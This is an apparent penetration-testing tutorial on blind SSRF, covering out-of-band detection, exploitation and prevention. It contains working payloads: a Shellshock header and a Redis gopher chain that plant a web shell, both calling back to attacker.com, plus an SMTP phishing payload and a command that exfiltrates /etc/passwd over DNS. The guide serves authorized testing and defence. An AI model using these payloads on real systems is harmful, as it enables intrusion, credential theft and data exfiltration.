# Blind SSRF vulnerabilities

Blind SSRF occurs when an application makes outbound requests based on user input but **does not return the response** in the front-end. You can trigger requests but can't directly see results, making exploitation more challenging but still dangerous.

Blind SSRF often has lower immediate impact than full-read SSRF, but can still lead to:
- Internal network mapping and service discovery
- Exploitation of vulnerable internal services (RCE via Shellshock, etc.)
- Time-delayed data exfiltration
- Client-side attacks against the requesting server itself

> Only test systems you own or are explicitly authorized to assess.

## What makes SSRF "blind" (and why it matters)

In regular SSRF, you see the response:
```http
POST /fetch HTTP/1.1
Content-Type: application/x-www-form-urlencoded

url=http://169.254.169.254/latest/meta-data/

HTTP/1.1 200 OK
Content-Length: 245

ami-id
ami-launch-index
...
```

In blind SSRF, the app makes the request but you only see:
```http
HTTP/1.1 200 OK
Content-Length: 23

Request processed successfully
```

Or even just a generic success/error, with no indication of what the backend saw.

Common scenarios:
- **Webhooks**: app fetches URL you provide but only confirms "webhook registered"
- **Image processing**: app fetches image from URL but only returns "processing queued"
- **Analytics/tracking**: app follows links in Referer but shows no output
- **Background jobs**: request triggers async processing with no direct response
- **PDF generation**: app includes remote resources but only returns the final PDF

## Detection via out-of-band (OAST) techniques

Since you can't see responses, detect blind SSRF by making the target request **your server** and observe incoming connections.

### DNS-based detection (most reliable)
Even if HTTP is blocked, DNS lookups often succeed (needed for basic internet functionality).

Burp Collaborator pattern:
```text
http://unique-id.burpcollaborator.net
http://ssrf-test-8472.burpcollaborator.net
```

What you'll see in Collaborator:
- DNS query (proves the app parsed your URL and attempted resolution)
- HTTP request (proves it made the full connection)

DIY approach (if you control a domain):
```bash
# Set up listener on your server
sudo tcpdump -i eth0 port 53 or port 80

# Monitor access logs
tail -f /var/log/nginx/access.log
```

Test payloads:
```text
http://test1.yourdomain.com
http://test2.yourdomain.com
http://169.254.169.254.yourdomain.com  (useful for bypassing filters that check subdomain)
```

### HTTP vs DNS-only callbacks (what they mean)
**DNS query only**: App tried to connect but HTTP was blocked by egress filtering or network ACLs.

**DNS + HTTP**: Full SSRF capability; you can reach internal services.

**Neither**: Either not vulnerable, or your payload was filtered/rejected before processing.

## Exploitation strategies (no direct response)

### 1) Internal network mapping (timing + DNS)
Even without seeing responses, you can map internal networks using timing differences and DNS patterns.

Port scanning (timing-based):
```python
# Pseudocode
for port in [22, 80, 443, 3306, 6379, 8080, 9200]:
    start = time.now()
    trigger_ssrf(f"http://192.168.1.5:{port}")
    elapsed = time.now() - start
    
    if elapsed < 1s:
        print(f"Port {port}: likely closed (instant reject)")
    elif elapsed > 5s:
        print(f"Port {port}: likely open or filtered (timeout/hung)")
```

Service fingerprinting (DNS subdomain encoding):
```text
http://scan-192-168-1-5-port-80.attacker.com
http://scan-192-168-1-5-port-8080.attacker.com
```

Your DNS server logs the queries, allowing you to track which IPs/ports the app attempted to reach.

### 2) Exploiting vulnerable services blindly (payload delivery)
Send payloads designed to trigger **side effects** on vulnerable internal services, then detect success via secondary indicators.

#### Shellshock exploitation (classic blind RCE)
If an internal service runs a vulnerable CGI script:

```text
http://192.168.1.10/cgi-bin/status
```

With header injection (if you control headers sent by the backend request):
```text
User-Agent: () { :; }; /usr/bin/curl http://attacker.com/$(whoami)
```

Or via URL parameter:
```text
http://192.168.1.10/cgi-bin/stats?param=() { :; }; curl http://attacker.com/pwned
```

Detection:
- Watch for HTTP callback to attacker.com
- Callback URL encodes command output

#### Redis exploitation (blind command injection)
Using protocol smuggling (if `gopher://` or similar is supported):

```text
gopher://192.168.1.10:6379/_CONFIG%20SET%20dir%20/var/www/html
gopher://192.168.1.10:6379/_CONFIG%20SET%20dbfilename%20shell.php
gopher://192.168.1.10:6379/_SET%20payload%20"%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E"
gopher://192.168.1.10:6379/_SAVE
```

Then trigger a callback:
```text
http://192.168.1.10/shell.php?c=curl%20http://attacker.com/success
```

#### SMTP abuse (blind email sending)
```text
gopher://192.168.1.5:25/_MAIL%20FROM:attacker@evil.com%0aRCPT%20TO:victim@target.com%0aDATA%0aSubject:Phishing%0a%0aBody%0a.%0aQUIT
```

Detection: victim receives email (or you receive bounce/confirmation).

### 3) Data exfiltration via DNS tunneling
Encode stolen data in DNS queries to your domain.

Example concept (if you can chain with another bug like XXE or command injection):
```bash
# On compromised internal service
data=$(cat /etc/passwd | base64 | tr -d '\n')
curl http://$data.exfil.attacker.com
```

Your DNS server receives queries like:
```text
cm9vdDp4OjA6MDpyb290Oi9yb290...exfil.attacker.com
```

Base64 decode to recover data.

### 4) HTTP smuggling / request splitting (if backend client is vulnerable)
Some HTTP clients have parsing bugs. If you can inject CRLF or exploit HTTP/2 downgrade issues, you might smuggle a second request.

Payload concept (historical, environment-specific):
```text
http://192.168.1.5:8080/path HTTP/1.1\r\nHost: 192.168.1.5\r\n\r\nGET /admin HTTP/1.1\r\nHost: 192.168.1.5\r\n\r\n
```

If vulnerable, the backend server processes two requests, and the second may bypass auth.

### 5) Attacking the SSRF client itself (server-side client vulnerabilities)
The server making outbound requests uses an HTTP client library that may have vulnerabilities.

Attack vectors:
- Redirect the request to a malicious server you control
- Return a crafted HTTP response designed to exploit the client
- Target known CVEs in HTTP libraries (buffer overflows, parser bugs, XXE in XML responses)

Example flow:
```text
1. App fetches http://attacker.com/payload
2. attacker.com responds with malicious HTTP response exploiting client parser
3. RCE on the app server
```

## Detection workflow (practical steps)

### Step 1: Identify potential blind SSRF injection points
Look for features that:
- Accept URLs but don't show fetched content (webhooks, import, fetch, load, proxy)
- Process user-provided URLs asynchronously (background jobs, scheduled tasks)
- Log or track external URLs (analytics, Referer tracking)

### Step 2: Test with unique identifiers
Use Burp Collaborator or your own domain with unique subdomains per test:

```text
Test 1: http://test1.burpcollaborator.net
Test 2: http://test2.burpcollaborator.net
Test 3: http://test3.burpcollaborator.net
```

Track which tests generate callbacks.

### Step 3: Differentiate DNS-only vs full HTTP
If you only see DNS:
- Egress HTTP is likely blocked
- Focus on DNS-based techniques (exfil, timing, mapping)
- Try alternate protocols (`ftp://`, `gopher://`, `dict://`)

If you see HTTP:
- Full blind SSRF confirmed
- Can target internal HTTP services
- Can exploit HTTP-based vulnerabilities

### Step 4: Map internal network (authorized testing only)
Sweep private IP ranges:
```text
http://192.168.0.1.unique-id.attacker.com
http://192.168.0.2.unique-id.attacker.com
http://192.168.1.1.unique-id.attacker.com
http://10.0.0.1.unique-id.attacker.com
```

Or use timing:
```python
for ip in ['192.168.0.' + str(i) for i in range(1, 255)]:
    start = time()
    test_ssrf(f"http://{ip}:80")
    if time() - start > 5:
        print(f"{ip}:80 - open or filtered")
```

### Step 5: Target specific services
Once you've mapped live hosts, target known vulnerable services:
```text
http://192.168.1.5:6379/  (Redis)
http://192.168.1.5:9200/  (Elasticsearch)
http://192.168.1.10:8080/manager/html  (Tomcat)
http://192.168.1.20/cgi-bin/  (CGI/Shellshock)
```

### Step 6: Trigger exploits and monitor for callbacks
Send exploit payloads, watch for:
- HTTP callbacks to your domain
- DNS queries encoding success/data
- Changes in app behavior (new accounts created, emails sent)

## Advanced techniques

### DNS rebinding (multi-request scenarios)
If the app validates then fetches (two separate requests), use DNS rebinding:

1st request (validation): your domain resolves to safe IP (public site)
2nd request (actual fetch): your domain resolves to internal IP (169.254.169.254)

Requires:
- Control over DNS server with low TTL
- Script to alternate A record responses

### Protocol smuggling with URL schemes
Test alternate protocols (if supported by backend HTTP client):

```text
file:///etc/passwd
dict://192.168.1.5:6379/INFO
gopher://192.168.1.5:6379/_SET%20key%20value
ftp://192.168.1.5/
ldap://192.168.1.5/
```

### Chaining with other vulnerabilities
- **Open redirect** → SSRF: bypass whitelist by chaining through allowed domain
- **XXE** → Blind SSRF: use XXE to trigger SSRF, exfil via OOB
- **CORS misconfiguration**: if internal service has CORS enabled, chain SSRF with XSS

## Impact scenarios (real-world blind SSRF)

### Scenario 1: Internal service discovery leading to targeted exploitation
```text
1. Find blind SSRF in webhook endpoint
2. Map internal network via timing (discover Redis on 192.168.1.10:6379)
3. Send gopher:// payload to execute Redis commands
4. Write web shell via Redis persistence
5. Access shell for full compromise
```

### Scenario 2: Shellshock on internal CGI
```text
1. Find blind SSRF in image processing
2. Test internal IPs for CGI endpoints
3. Exploit Shellshock via User-Agent injection
4. Command output exfiltrated via DNS tunnel
```

### Scenario 3: Metadata service credential theft
```text
1. Find blind SSRF in PDF generator
2. Request http://169.254.169.254/latest/meta-data/iam/security-credentials/role
3. Use DNS exfil or HTTP callback to steal credentials
4. Use stolen AWS keys for lateral movement
```

## Prevention (same as regular SSRF but more critical)

Blind SSRF is harder to detect via monitoring (no obvious data leaks), so prevention is even more important.

### 1) Validate and deny private destinations
```python
import ipaddress

BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # cloud metadata
]

def is_blocked_ip(hostname):
    try:
        ip = ipaddress.ip_address(hostname)
        return any(ip in net for net in BLOCKED_RANGES)
    except:
        resolved = socket.gethostbyname(hostname)
        return is_blocked_ip(resolved)
```

### 2) Network-level egress filtering
- Block outbound to RFC 1918 ranges at firewall
- Block cloud metadata endpoints (169.254.169.254)
- Whitelist only necessary external destinations

### 3) Monitor outbound requests
Log all backend requests:
- Destination IP/hostname
- Triggering user/request
- Response status (even if not shown to user)

Alert on:
- Requests to private IPs
- Unusual ports (6379, 9200, etc.)
- High volume of requests (scanning behavior)
- Requests to known metadata endpoints

### 4) Use dedicated egress proxies
Route all outbound requests through a proxy that:
- Enforces allow-lists
- Blocks private IPs after DNS resolution
- Logs all traffic
- Rate-limits per source

### 5) Disable unnecessary protocols
```python
# Requests library example
import requests

# Only allow HTTP/HTTPS
allowed_schemes = ['http', 'https']
parsed = urlparse(url)
if parsed.scheme not in allowed_schemes:
    raise ValueError("Protocol not allowed")
```
